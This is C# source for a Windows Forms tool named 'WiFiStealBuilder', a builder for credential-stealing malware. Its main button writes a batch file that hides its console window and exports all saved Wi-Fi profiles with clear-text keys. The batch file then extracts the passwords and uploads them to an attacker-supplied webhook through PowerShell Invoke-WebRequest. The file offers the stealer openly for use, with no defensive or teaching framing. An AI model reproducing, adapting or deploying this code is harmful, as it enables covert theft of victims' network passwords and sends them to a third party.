using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Drawing.Text;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Diagnostics;
using System.IO;

namespace WiFiStealBuilder
{
    public partial class Form1 : MetroFramework.Forms.MetroForm
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {

        }

        private void metroTextBox1_Click(object sender, EventArgs e)
        {

        }

        private void metroLabel1_Click(object sender, EventArgs e)
        {

        }

        private void metroButton1_Click(object sender, EventArgs e)
        {
            string webHookUrl = metroTextBox1.Text;

            // Формирование команд для выполнения в cmd и powershell
            string cmdCommand = "mode con: cols=15 lines=1 && cd %temp% && netsh wlan export profile key=clear && powershell Select-String -Path *.xml -Pattern 'keyMaterial' > Wi-Fi-PASS && powershell Invoke-WebRequest -Uri " + webHookUrl + " -Method POST -InFile Wi-Fi-PASS && exit";

            SaveFileDialog saveFileDialog = new SaveFileDialog();
            saveFileDialog.Filter = "Batch Files|*.bat";
            saveFileDialog.Title = "Save the compiled BAT file";
            if (saveFileDialog.ShowDialog() == DialogResult.OK)
            {
                string batFilePath = saveFileDialog.FileName;
                File.WriteAllText(batFilePath, cmdCommand);

                MessageBox.Show("Build completed. The BAT file is saved at: " + batFilePath);
            }
            else
            {
                MessageBox.Show("Build cancelled.");
            }
        }

        private void label1_Click(object sender, EventArgs e)
        {

        }

        private void bunifuFlatButton1_Click(object sender, EventArgs e)
        {
            string webHookUrl = metroTextBox1.Text;
            label1.Text = "Your webhook:             " + webHookUrl;
        }

        private void pictureBox1_Click(object sender, EventArgs e)
        {
            
        }

        private void bunifuImageButton1_Click(object sender, EventArgs e)
        {
            Process.Start("https://github.com/K3rnel-Dev");
        }
    }
}